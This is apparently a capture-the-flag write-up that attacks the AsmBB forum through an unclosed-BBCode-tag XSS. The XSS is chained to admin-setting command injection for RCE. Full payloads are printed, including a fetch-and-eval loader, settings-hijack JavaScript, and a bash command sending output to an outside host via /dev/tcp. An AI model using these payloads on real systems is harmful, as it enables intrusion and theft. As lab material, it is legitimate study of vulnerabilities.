# true\_web\_assembly

## Description

> [https://board.asm32.info/asmbb-v2-9-has-been-released.328/](https://board.asm32.info/asmbb-v2-9-has-been-released.328/)
>
> From the post:
>
> * “AsmBB is very secure web application, because of the internal design and the reduced dependencies. But it also supports encrypted databases, for even higher security.”
> * “Download, install and hack”
>
> Yes

## Solution

The challenge is to attack the latest version of [AsmBB](https://asm32.info/fossil/asmbb/index), a web-based message board implemented entirely in x86 assembly. The provided Dockerfile builds the `asmbb` engine using the source files from the `asmbb` and `freshlib` repositories.

```docker
# Get source files for asmbb
RUN wget https://asm32.info/fossil/asmbb/tarball/4c91cddaec/asmbb-4c91cddaec.tar.gz -O asmbb.tar.gz && \
	/bin/bash -c "echo 'b1e621d1ae988b35e836ec9142ccc6ce6cf7c24a090c4d973894770a62fa4ddc asmbb.tar.gz' | sha256sum --check" && \
	tar -xf asmbb.tar.gz || true && \
	mv asmbb-* asmbb

# Get source files for freshlib
# AsmBB uses functions from freshlib
RUN wget https://fresh.flatassembler.net/fossil/repo/fresh/tarball/6636a57441/Fresh+IDE-6636a57441.tar.gz -O fresh.tar.gz && \
	/bin/bash -c "echo '5ba395b0e957536bd66abc572414085aab5f2a527d28214881bbba72ec53e00d fresh.tar.gz' | sha256sum --check" && \
	tar -xf fresh.tar.gz && \
	mv Fresh* Fresh

# Build the asmbb engine
RUN lib=/Fresh/freshlib TargetOS=Linux /fasm/fasm -m 200000 /asmbb/source/engine.asm /engine
```

## Gaining XSS

The forum is the main feature of AsmBB, and the default build uses a custom markdown-like parser called MiniMag. Our goal is to achieve a GET-based XSS on the admin user, and subsequently abuse admin features for RCE.

<figure><img src="../../.gitbook/assets/Screenshot 2023-03-12 at 10.18.45 PM.png" alt=""><figcaption></figcaption></figure>

Let's take a look at the AsmBB [source](https://asm32.info/fossil/asmbb). [`render2.asm`](https://asm32.info/fossil/asmbb/file?name=source/render2.asm\&ci=4c91cddaec90fb74) contains a "hash table" of commands used by the templating engine, mapped to their routines.

```nasm
PHashTable tableRenderCmd, tpl_func,                      \
        'special:',     RenderTemplate.cmd_special,       \
        'raw:',         RenderTemplate.cmd_raw,           \
        'include:',     RenderTemplate.cmd_include,       \
        'minimag:',     RenderTemplate.cmd_minimag,       \   ; HTML, no encoding.
        'bbcode:',      RenderTemplate.cmd_bbcode,        \   ; HTML, no encoding.
        'html:',        RenderTemplate.cmd_html,          \   ; HTML, disables the encoding.
        'attachments:', RenderTemplate.cmd_attachments,   \   ; HTML, no encoding.
        'attach_edit:', RenderTemplate.cmd_attachedit,    \   ; HTML, no encoding.
        'url:',         RenderTemplate.cmd_url,           \   ; Needs encoding!
        'json:',        RenderTemplate.cmd_json,          \   ; No encoding.
        'css:',         RenderTemplate.cmd_css,           \   ; No output, no encoding.
        'equ:',         RenderTemplate.cmd_equ,           \
        'const:',       RenderTemplate.cmd_const,         \
        'enc:',         RenderTemplate.cmd_encode,        \   ; encode the content in html encoding.
        'usr:',         RenderTemplate.cmd_user_encode    \   ; encodes the unicode content of the user nickname for unicode-clones distinction.
```

We can see this in action in [`post_view.tpl`](https://asm32.info/fossil/asmbb/file?name=www/templates/Urban+Sunrise/post\_view.tpl\&ci=4c91cddaec90fb74) where the post is rendered. Depending on `format`, the post content is either parsed with `minimag` or `bbcode`, and the final output is rendered as HTML.

```html
<article class="post-text">
  [html:[[case:[format]|minimag:[include:minimag_suffix.tpl]|bbcode:][Content]]]

</article>
```

Although the client-side UI only allows us to write content in the MiniMag format, the POST request to submit the post does include a `format` parameter.

```http
POST /!post HTTP/1.1
Host: localhost:9032
Content-Length: 917
...
Connection: close

...

------WebKitFormBoundarydKCsA6RKHAepAWPn
Content-Disposition: form-data; name="format"

0
------WebKitFormBoundarydKCsA6RKHAepAWPn
Content-Disposition: form-data; name="source"

[http://example.com][My link] 
------WebKitFormBoundarydKCsA6RKHAepAWPn--
```

When set to 1, the `format` parameter allows us to use the [BBCode](https://en.wikipedia.org/wiki/BBCode) parser instead. This uses the `bbcode` command, which calls the `.cmd_bbcode` routine.

```nasm
.cmd_bbcode:
; here esi points to ":" of the "bbcode:" command. edi points to the start "[" and ecx points to the end "]"

locals
  BenchVar .bbcode_time
endl

        BenchmarkStart .bbcode_time

        stdcall TextMoveGap, edx, ecx
        stdcall TextSetGapSize, edx, 4
        mov     dword [edx+ecx], 0
        add     [edx+TText.GapBegin], 4
        inc     [edx+TText.GapEnd]              ; delete the end "]"

        stdcall TextMoveGap, edx, edi
        add     [edx+TText.GapEnd], 8

        stdcall TranslateBBCode, edx, edi, SanitizeURL
        
        ...
```

Since the BBCode parser was a [newer](https://board.asm32.info/the-latest-update-of-this-forum.258/) parser introduced after MiniMag, and isn't enabled by default, we thought this would be the best place to start looking for parser vulnerabilities.

The `TranslateBBCode` routine from [`bbcode.asm`](https://fresh.flatassembler.net/fossil/repo/fresh/artifact/0457fbe206805cbe) (found in [FreshLib](https://fresh.flatassembler.net/fossil/repo/fresh)) is then used to parse the BBCode content. Here we see a table of supported BBCode tags.

```nasm
PHashTable tableBBtags, tpl_func,                      \
        'b',       tagStrong,                          \
        '*',       tagListItem,                        \
        'i',       tagEm,                              \
        'u',       tagUnderlined,                      \
        's',       tagDel,                             \
        'c',       tagInlineCode,                      \
        'url',     tagURL,                             \
        'img',     tagImg,                             \
        'quote',   tagQuote,                           \
        
        ...
```

BBCode is an old markup language that has a rather simple syntax. Tags are enclosed by square brackets, and some tags can have attributes, such as the following URL tag:

```bbcode
[url=https://example.com]My link[/url]
```

The main loop of the parser is found at `.loop`. For each character, the logic goes:

* if the end of the text has been reached, exit the loop
* if it is a newline or space character, skip it
* if it is `[`, process the tag at `.start_tag`
* if it is the start of an emoji, process the emoji

```nasm
.loop:
        mov     ecx, [edx+TText.GapEnd]
        cmp     ebx, [edx+TText.GapBegin]
        cmovb   ecx, [edx+TText.GapBegin]
        sub     ecx, [edx+TText.GapBegin]
        add     ecx, ebx
        cmp     ecx, [edx+TText.Length]
        jae     .end_of_text
        
        movzx   eax, byte [edx+ecx]

        test    al, al
        jz      .end_of_text

        cmp     al, $0d
        je      .new_line

        cmp     al, $0a
        je      .new_line

        cmp     al, $20
        jbe     .next           ; skip all whitespace

        ...

.paragraph_ok:

        cmp     al, "["
        je      .start_tag

; here check for emoticons

        cmp     al, $f0         ; emoji?
        jb      .continue
        
        ...
```

Otherwise, we go to `.continue`, where the character is HTML encoded.

```nasm
.continue:

; html encoding from here

        test    al, al          ; all values > 127 are unicode and should not be encoded.
        js      .next

        movzx   eax, byte [tbl_html+eax]
        test    al, al
        jz      .del_char
        jns     .next           ; the same as above

        lea     esi, [eax+tbl_html]     ; the address of the replacement string.
        lodsb
        movzx   ecx, al         ; length

; insert the replacement html encoding from esi
        stdcall TextMoveGap, edx, ebx
        stdcall TextSetGapSize, edx, ecx
        inc     [edx+TText.GapEnd]      ; delete the previous char.

        mov     edi, [edx+TText.GapBegin]
        add     edi, edx
        add     [edx+TText.GapBegin], ecx
        add     ebx, ecx

        rep movsb
        jmp     .loop
```

Notice that unless the current character is part of an emoji or part of an opening/closing tag, we will reach the HTML-encoding logic. This is done through a simple text substitution that sanitizes angle brackets, quotes, and ampersands.

```nasm
HtmlEntities tbl_html,        \
  $09, $0d,                   \
  $0a, $0a,                   \
  $0d, $0d,                   \
  '<', '&lt;',                \
  '>', '&gt;',                \
  '"', '&quot;',              \
  "'", '&apos;',              \
  '&', '&amp;'
```

Since everything outside the opening/closing tag are HTML-encoded, let's take a closer look at the tag-processing logic. When a tag is matched, a string substitution is performed based on the table below.

```nasm
...

tagImg          onetag <txt '<img class="block"', HTML_IMG_ATTR, 'alt="'>, txt '" src="',  txt '" />',         fBlockTag  or fDisableTags or fURLContent
tagInlineImg    onetag <txt '<img class="inline"', HTML_IMG_ATTR,'alt="'>, txt '" src="',  txt '" />',         fInlineTag or fDisableTags or fURLContent
tagSize         onetag txt '<span style="font-size:',               txt '">',       txt '</span>',      fInlineTag
tagColor        onetag txt '<span style="color:',                   txt '">',       txt '</span>',      fInlineTag
tagEmail        onetag txt '<a href="mailto:',                      txt '">',       txt '</a>',         0

...
```

The 2nd, 3rd, and 4th columns correspond to the start of the tag, end of the attribute, and end of the tag respectively. For instance, the following markup

```bbcode
[email=example@example.com]Click Here[/email]
```

becomes

```
<a href="mailto: + example@example.com + "> + Click Here + </a>
```

The attribute value and the content in between the opening/closing tags are processed separately from the tag itself, and are thus subject to HTML-encoding. If there's any parsing bug to be found, it would probably have to be while parsing the tag.

_What if we just don't close the tag?_

Since the tag isn't being encoded while it is processed, there might be an edge case where the unencoded content is reflected in the absence of a closing `]`.

_Voilà_, the following markup

```bbcode
[email=<img src=x onerror=alert() 
```

translates to

```html
<a href="mailto:&lt;img src=x onerror=alert() "><img src=x onerror=alert() </a>
```

which when rendered on a browser, pops an alert!

<figure><img src="../../.gitbook/assets/Screenshot 2023-03-13 at 9.59.13 PM.png" alt=""><figcaption></figcaption></figure>

## Honourable Mentions

We also found two POST-based XSS vectors, which unfortunately were unusable in this challenge in the absence of an open redirect (since the admin bot is only able to visit the challenge page, and no other page).

The first was a POST request to `!post`. This would have reflected the XSS payload in the page `<title>`.

```markup
<html>
  <body>
    <form action="http://localhost:9032/!post" method="POST">
      <input type="hidden" name="attach" value="" />
      <input type="hidden" name="format" value="0" />
      <input type="hidden" name="invited" value="1" />
      <input type="hidden" name="limited" value="1" />
      <input type="hidden" name="preview" value="p" />
      <input type="hidden" name="source" value="foo" />
      <input type="hidden" name="tabselector" value="0" />
      <input type="hidden" name="tags" value="17" />
      <input type="hidden" name="ticket" value="foo" />
      <input type="hidden" name="title" value="e&lt;&#47;title&gt;&lt;script&gt;alert&#40;origin&#41;&lt;&#47;script&gt;" />
      <input type="submit" value="Submit request" />
    </form>
  </body>
</html>
```

<figure><img src="../../.gitbook/assets/Screenshot 2023-03-13 at 10.03.35 PM.png" alt=""><figcaption></figcaption></figure>

The second is a HTTP response splitting attack. The `!skincookie` endpoint reflects form data in the `Set-Cookie` header, and allows for for CRLF injection. In addition to XSS, this can be used to set arbitrary cookies and response headers.

<figure><img src="../../.gitbook/assets/Screenshot 2023-03-13 at 10.14.38 PM.png" alt=""><figcaption></figcaption></figure>

## Gaining RCE

Armed with admin privileges, one would see a suspiciously named setting in `/!settings`.

<figure><img src="../../.gitbook/assets/Screenshot 2023-03-13 at 10.18.53 PM.png" alt=""><figcaption></figcaption></figure>

A setting called "Pipe the emails through" sure sounds promising for RCE. Looking for the form key `smtp_exec` shows us that this option is being used in [`commands.asm`](https://asm32.info/fossil/asmbb/file?name=source/commands.asm\&ci=4c91cddaec90fb74) when sending a user activation email.

```nasm
proc SendActivationEmail, .stmt

.stmt2     dd ?
.subj      dd ?
.body      dd ?

.host      dd ?
.from      dd ?
.to        dd ?
.smtp_addr dd ?
.smtp_port dd ?
.exec      dd ?

begin
        
        ...

        xor     eax, eax
        stdcall GetParam, txt "smtp_exec", gpString
        mov     [.exec], eax
        test    eax, eax
        jnz     .addresses_ok

        ...

; send by external program.

        stdcall CreatePipe
        mov     ebx, eax

        stdcall FileWriteString, edx, txt "From: "
        stdcall FileWriteString, edx, [.from]
        stdcall FileWriteString, edx, txt "@"
        stdcall FileWriteString, edx, [.host]
        stdcall FileWriteString, edx, <txt 13, 10>

        stdcall FileWriteString, edx, txt "To: "
        stdcall FileWriteString, edx, [.to]
        stdcall FileWriteString, edx, <txt 13, 10>

        stdcall FileWriteString, edx, txt "Subject: "
        stdcall FileWriteString, edx, [.subj]
        stdcall FileWriteString, edx, <txt 13, 10>

        stdcall FileWriteString, edx, [.body]
        stdcall FileWriteString, edx, <txt 13, 10>

        stdcall FileClose, edx
        stdcall Exec2, [.exec], ebx, [STDOUT], [STDERR]
        stdcall WaitProcessExit, eax, -1

        stdcall FileClose, ebx
        clc
        jmp     .finish
```

Looks like our `smtp_exec` option is being passed to `Exec2`. A quick look at [`process.asm`](https://fresh.flatassembler.net/fossil/repo/fresh/artifact/6e99edc24ea48311) reveals that this spawns a child process with our input. Great!

```nasm
body Exec2
.pArgs dd ?
begin
        pushad

        stdcall StrSplitArg, [.hCommand]
        mov     [.pArgs], eax

        mov     eax, sys_fork
        int     $80

        test    eax, eax
        jnz     .parent         ; this is the parent process

; here is the child.

        DebugMsg "Child process here!"
        
        ...
```

All we have to do now is to change this option to a payload that sends us the flag.

```
/bin/bash -c /readflag>/dev/tcp/0.tcp.ngrok.io/11818
```

## Putting It All Together

Here's the final exploit that we will serve to the admin. Here, I used a first-stage payload to keep the exploit small, but serving the whole exploit in one payload would work as well.

```javascript
fetch("http://HOST:PORT/exploit.js").then(r=>r.text()).then(eval)
```

is converted to base64 and eval-ed:

{% code overflow="wrap" %}
```
[color=<img src=x onerror=eval(atob('ZmV0 ... bCk=')) 
```
{% endcode %}

which then executes the RCE payload:

```javascript
const rce = (smtp_exec, ticket) => {
    fetch(`${window.origin}/!settings`, {
        method: "POST",
        headers: {
            "Content-Type": "application/x-www-form-urlencoded"
        },
        body: `forum_title=&forum_header=%3Ch1+style%3D%22font-weight%3A+800%22%3EAsmBB%3C%2Fh1%3E%0D%0A%3Cb+style%3D%22text-align%3A+center%22%3EPower%3Cbr%3E%0D%0A%3Csvg+version%3D%221.1%22+width%3D%2264%22+height%3D%2216%22+viewBox%3D%220+0+64+16%22+xmlns%3D%22http%3A%2F%2Fwww.w3.org%2F2000%2Fsvg%22%3E%0D%0A+%3Cpath+d%3D%22m0+6+8+10h34l-6-6+28-2-50-8+8+8z%22%2F%3E%0D%0A%3C%2Fsvg%3E%0D%0A%3C%2Fb%3E%0D%0A&description=&keywords=&tabselector=1&host=asdf&smtp_addr=asdf&smtp_port=25`
            + `&smtp_exec=${smtp_exec}&smtp_user=asdf&email_confirm=on&user_perm=1&user_perm=2&user_perm=4&user_perm=8&user_perm=16&user_perm=64&user_perm=256&user_perm=512&user_perm=1024&post_interval=0&post_interval_inc=0&max_post_length=0&anon_perm=1&anon_perm=2&activate_min_interval=0&default_lang=0&page_length=20&default_skin=Urban+Sunrise&default_mobile_skin=Urban+Sunrise&chat_enabled=on&markups=1&password=`
            + `&ticket=${ticket}&save=Save`
    })
}

const smtp_exec = encodeURIComponent("/bin/bash -c /readflag>/dev/tcp/HOST/PORT")

fetch(`${window.origin}/!settings`)
    .then(response => response.text())
    .then(text => {
        const m = text.match(/name="ticket" value="([^"]+)"/);
        console.log(m);
        if (m) {
            const ticket = m[1];
            rce(smtp_exec, ticket)
        }
    });
```

Once the admin visits our exploit page, just register a new user and the flag will be sent to us!

```
$ nc -lv 1337
hxp{iTs_f4s7_iT$_sM4lL_NoB0d1_c4n_br3aK_!t_1f_n0b0dY_c4n_r3ad_i7}
```
